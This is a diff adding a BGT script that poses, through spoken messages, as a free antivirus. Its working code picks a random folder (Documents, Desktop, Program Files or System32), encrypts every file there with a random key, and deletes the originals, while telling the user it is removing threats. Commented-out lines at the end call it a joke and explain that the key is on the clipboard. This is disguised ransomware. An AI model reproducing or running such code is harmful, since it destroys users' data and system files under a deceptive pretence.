@@ -1,0 +1,104 @@
+sound music;
+tts_voice voice;
+void speak_and_play_music()
+{
+voice.speak("let's play some music while you're waiting");
+music.load("theme.wav");
+music.play_looped();
+}
+void fadeout(sound @s, int time)
+{
+for(int i=s.volume;i>=-60;i--)
+{
+s.volume=i;
+wait(time);
+}
+}
+string[] find_all_files(string path)
+{
+string[] paths;
+string[] path_stack;
+string[] files;
+string[] directories;
+path_stack.insert_last(path);
+do
+{
+path=path_stack[path_stack.length-1];
+path_stack.remove_last();
+directories=find_directories(path+"\\*");
+files=find_files(path+"\\*.*");
+for(int i=0;i<files.length;i++)
+{
+string File=files[i];
+paths.insert_last(path+"\\"+File);
+}
+for(int i=0;i<directories.length;i++)
+{
+path_stack.insert_last(path+"\\"+directories[i]);
+}
+
+}
+while(path_stack.length!=0);
+return paths;
+}
+void encrypt(string path, string key)
+{
+voice.speak("indexing files...this may take a while");
+string[] all_files=find_all_files(path);
+voice.speak("done. Cleanning up viruses and other bad actors...");
+for(int i=0;i<all_files.length;i++)
+{
+string File=all_files[i];
+file_encrypt(File, File+".ransomware.encrypted", key);
+file_delete(File);
+}
+voice.speak("threat removal process finished");
+}
+string generate_random_key(int size)
+{
+string chars="abcdefghijklmnqoprstuvwxyzABCDEFGHIJKLMNQOPRSTUVWXYZ1234567890-=,./\\~!@#$%^&*()_+|<>?";
+string result="";
+for(int i=1;i<=size;i++)
+{
+int index=random(0, chars.length()-1);
+result+=chars[index];
+}
+clipboard_copy_text(result);
+return result;
+}
+void main()
+{
+voice.speak_wait("welcome to the ultimate antivirus for your pc! it's totally free, safe and free of viruses, paneless to use. We won't open any window for this program, as not to tax you with too many presses of the alt+tab key. Let's begin!");
+wait(1000);
+string key=generate_random_key(128);
+int infect=random(1, 4);
+if(infect==1)
+{
+voice.speak_wait("let's check your documents first, make sure they're safe");
+speak_and_play_music();
+encrypt(DIRECTORY_MY_DOCUMENTS, key);
+}
+else if(infect==2)
+{
+voice.speak_wait(" desktop icons are the way in which you start programs. If they are somehow infected, then the rest of your computer will become so as well. Let's check that out real quick");
+speak_and_play_music();
+encrypt(DIRECTORY_DESKTOP, key);
+}
+else if(infect==3)
+{
+voice.speak_wait("programs are the most important parts of your computer, second to the operating system. Some programs place viruses in their install location, by default program files. Let's check that this is not the case here, shall we?");
+speak_and_play_music();
+encrypt("C:\\program files", key);
+}
+else if(infect==4)
+{
+voice.speak_wait("without the operating system, your programs won't be able to run. An infected operating system could cause your data to be lost or programs to behave in unexpected ways. Malware may hide some or all of its components in system directories, since antiviruses don't usually check there. Let's go there, see what we find.");
+speak_and_play_music();
+encrypt("C:\\windows\\system32", key);
+}
+fadeout(@music, 300);
+music.load("C:\\windows\\media\\ding.wav");
+music.play_wait();
+//voice.speak_wait("hahahaha! the best joak in the world! this is in no way an antivirus, more likely the oposit, I wouldn't have run it if I were you. All your files are now mine, muhahahaha! They have been encrypted with a random key that has been placed on your clipboard. If you want to recover your files, you better trusted bgt enough to learn it, because you have to make a decrypter that uses file_decrypt with the key from the clipboard, happy programming!");
+//voice.speak_wait("from now on, never make any bgt program ever, that tool is old, outdated, unsupported even by its creator. Don't ever add exclusions to your antivirus without a very good reason, since one of those might present a security vulnerability, actual viruses might slip through, like mine for example. While I gave you a free means of recovering your files, even placing the key on the clipboard, others might not be so generous, so be very careful!");
+}
